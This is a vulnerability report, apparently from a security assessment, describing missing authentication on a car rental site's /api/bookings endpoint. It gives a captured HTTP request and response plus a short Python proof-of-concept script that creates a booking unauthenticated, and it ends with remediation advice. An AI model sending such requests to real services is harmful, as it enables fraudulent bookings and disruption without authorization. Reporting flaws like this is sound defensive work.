# Broken Function Level Authorization: Unauthenticated Booking Creation

**ID:** vuln-0004
**Severity:** MEDIUM
**Found:** 2026-08-27 19:51:24 UTC
**Target:** https://rentals.onlineverywhere.com
**Endpoint:** /api/bookings
**Method:** POST
**CWE:** CWE-862
**CVSS:** 6.5
**Fix Effort:** Medium

## Description

The /api/bookings endpoint allows unauthenticated users to create new car rental bookings. This bypasses any intended authorization controls, enabling unauthorized individuals to create bookings.

## Evidence

POST /api/bookings HTTP/1.1\nHost: rentals.onlineverywhere.com\nContent-Type: application/json\n\n{"pickupDate":"2026-09-10","returnDate":"2026-09-11","vehicleId":"v1","customerName":"Auth Test User","customerEmail":"auth@example.com","customerPhone":"987-654-3210","licenseNumber":"XYZ78901","licenseExpiry":"2032-11-15","licenseIssuer":"Barbados","licenseClass":"C"}\n\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{"success":true,"bookingId":"BK-0513DF89","vehicleId":"v1","customerName":"Auth Test User","totalDays":2,"totalCost":240,"sheetStored":true}

## Impact

Unauthorized users can create bookings, leading to potential abuse of the system, creation of fraudulent bookings, and resource exhaustion. This can result in financial losses, operational disruption, and reputational damage for the rental service.

## Technical Analysis

The /api/bookings endpoint does not enforce any authentication or authorization mechanisms, allowing any unauthenticated client to successfully create car rental bookings. This exposes a critical vulnerability where an attacker can interact with a core business function without proper access control.

## Proof of Concept

1. Construct a valid JSON payload for a new booking.
2. Send a POST request to /api/bookings with the payload, without including any authentication headers or session cookies.
3. Observe that the booking is successfully created, as indicated by a 200 OK response and a new booking ID.

```python
import requests\n\nurl = "https://rentals.onlineverywhere.com/api/bookings"\nheaders = {"Content-Type": "application/json"}\n\npayload = {\n    "pickupDate": "2026-09-10",\n    "returnDate": "2026-09-11",\n    "vehicleId": "v1",\n    "customerName": "Auth Test User",\n    "customerEmail": "auth@example.com",\n    "customerPhone": "987-654-3210",\n    "licenseNumber": "XYZ78901",\n    "licenseExpiry": "2032-11-15",\n    "licenseIssuer": "Barbados",\n    "licenseClass": "C"\n}\n\nresponse = requests.post(url, headers=headers, json=payload)\nprint(f"Status Code: {response.status_code}")\nprint(f"Response Body: {response.text}")
```

## Remediation

Implement robust authentication and authorization checks on the /api/bookings endpoint. Ensure that only authenticated and authorized users (e.g., administrative staff or legitimate, logged-in customers) can create bookings. This typically involves requiring an authentication token (e.g., JWT) in the request headers and validating it on the server-side.

## Assumptions

The /api/bookings endpoint is intended to require authentication for creating bookings.
